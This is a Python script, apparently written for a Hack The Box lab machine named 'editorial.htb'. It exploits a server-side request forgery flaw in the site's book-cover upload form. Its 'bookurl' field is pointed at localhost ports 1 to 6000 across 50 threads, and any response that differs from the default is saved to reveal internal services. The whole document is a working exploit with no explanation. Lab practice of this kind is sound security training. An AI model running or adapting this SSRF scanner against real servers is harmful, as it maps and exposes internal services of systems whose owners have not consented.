import requests
from concurrent.futures import ThreadPoolExecutor
import os

url = "http://editorial.htb/upload-cover"
boundary = "14276312323520530593225841561"
expected_response = '/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg'

def make_request(port):
    data = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="bookurl"\r\n\r\n'
        f'http://127.0.0.1:{port}/\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="bookfile"; filename=""\r\n'
        'Content-Type: application/octet-stream\r\n\r\n\r\n'
        f'--{boundary}--\r\n'
    )
    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
    try:
        response = requests.post(url, data=data, headers=headers)
        if response.text != expected_response:
            with open(f'port_{port}_response.html', 'w') as file:
                file.write(response.text)
            print(f'Open port found: {port}, response saved to port_{port}_response.html')
    except requests.RequestException as e:
        print(f"Request failed for port {port}: {e}")

if __name__ == "__main__":
    if not os.path.exists('responses'):
        os.makedirs('responses')
    os.chdir('responses')
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(make_request, range(1, 6001))
